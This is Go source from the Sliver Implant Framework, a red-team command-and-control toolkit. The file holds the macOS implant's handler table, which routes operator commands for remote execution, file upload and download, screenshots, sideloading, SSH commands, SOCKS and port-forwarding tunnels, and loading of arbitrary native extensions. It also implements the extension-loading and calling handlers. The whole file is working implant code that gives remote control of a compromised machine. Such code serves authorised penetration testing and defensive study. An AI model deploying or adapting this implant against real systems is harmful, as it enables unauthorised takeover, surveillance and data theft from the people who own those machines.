package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"os"
	"os/user"
	"strconv"
	"syscall"

	"github.com/bishopfox/sliver/implant/sliver/extension"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

var (
	darwinHandlers = map[uint32]RPCHandler{
		pb.MsgPsReq:        psHandler,
		pb.MsgTerminateReq: terminateHandler,
		pb.MsgPing:         pingHandler,
		pb.MsgLsReq:        dirListHandler,
		pb.MsgDownloadReq:  downloadHandler,
		pb.MsgUploadReq:    uploadHandler,
		pb.MsgCdReq:        cdHandler,
		pb.MsgPwdReq:       pwdHandler,
		pb.MsgRmReq:        rmHandler,
		pb.MsgMkdirReq:     mkdirHandler,
		pb.MsgMvReq:        mvHandler,
		pb.MsgCpReq:        cpHandler,
		pb.MsgIfconfigReq:  ifconfigHandler,
		pb.MsgExecuteReq:   executeHandler,
		pb.MsgEnvReq:       getEnvHandler,
		pb.MsgSetEnvReq:    setEnvHandler,
		pb.MsgUnsetEnvReq:  unsetEnvHandler,
		pb.MsgChtimesReq:   chtimesHandler,
		pb.MsgGrepReq:      grepHandler,

		pb.MsgScreenshotReq: screenshotHandler,
		pb.MsgNetstatReq:    netstatHandler,

		pb.MsgSideloadReq: sideloadHandler,

		pb.MsgReconfigureReq: reconfigureHandler,
		pb.MsgSSHCommandReq:  runSSHCommandHandler,

		// Extensions
		pb.MsgRegisterExtensionReq: registerExtensionHandler,
		pb.MsgCallExtensionReq:     callExtensionHandler,
		pb.MsgListExtensionsReq:    listExtensionsHandler,

		// Wasm Extensions - Note that execution can be done via a tunnel handler
		pb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
		pb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,
		pb.MsgListWasmExtensionsReq:      listWasmExtensionsHandler,

		// {{if .Config.IncludeWG}}
		// Wireguard specific
		pb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
		pb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
		pb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
		pb.MsgWGStartSocksReq:     wgStartSocksHandler,
		pb.MsgWGStopSocksReq:      wgStopSocksHandler,
		pb.MsgWGListSocksReq:      wgListSocksServersHandler,
		// {{end}}
	}
)

// GetSystemHandlers - Returns a map of the darwin system handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return darwinHandlers
}

// Extensions

func registerExtensionHandler(data []byte, resp RPCResponse) {
	registerReq := &pb.RegisterExtensionReq{}

	err := proto.Unmarshal(data, registerReq)
	if err != nil {
		return
	}

	ext := extension.NewDarwinExtension(registerReq.Data, registerReq.Name, registerReq.OS, registerReq.Init)
	extension.Add(ext)
	err = ext.Load()
	registerResp := &pb.RegisterExtension{
		Response: &commonpb.Response{},
	}
	if err != nil {
		registerResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(registerResp)
	resp(data, err)
}

func callExtensionHandler(data []byte, resp RPCResponse) {
	callReq := &pb.CallExtensionReq{}

	err := proto.Unmarshal(data, callReq)
	if err != nil {
		return
	}

	callResp := &pb.CallExtension{
		Response: &commonpb.Response{},
	}
	gotOutput := false
	err = extension.Run(callReq.Name, callReq.Export, callReq.Args, func(out []byte) {
		gotOutput = true
		callResp.Output = out
		data, err = proto.Marshal(callResp)
		resp(data, err)
	})
	// Only send back synchronously if there was an error
	if err != nil || !gotOutput {
		if err != nil {
			callResp.Response.Err = err.Error()
		}
		data, err = proto.Marshal(callResp)
		resp(data, err)
	}
}

func listExtensionsHandler(data []byte, resp RPCResponse) {
	lstReq := &pb.ListExtensionsReq{}
	err := proto.Unmarshal(data, lstReq)
	if err != nil {
		return
	}

	exts := extension.List()
	lstResp := &pb.ListExtensions{
		Response: &commonpb.Response{},
		Names:    exts,
	}
	data, err = proto.Marshal(lstResp)
	resp(data, err)
}

func getUid(fileInfo os.FileInfo) string {
	uid := int32(fileInfo.Sys().(*syscall.Stat_t).Uid)
	uid_str := strconv.FormatUint(uint64(uid), 10)
	usr, err := user.LookupId(uid_str)
	if err != nil {
		return ""
	}
	return usr.Name
}

func getGid(fileInfo os.FileInfo) string {
	gid := int32(fileInfo.Sys().(*syscall.Stat_t).Gid)
	gid_str := strconv.FormatUint(uint64(gid), 10)
	grp, err := user.LookupGroupId(gid_str)
	if err != nil {
		return ""
	}
	return grp.Name
}
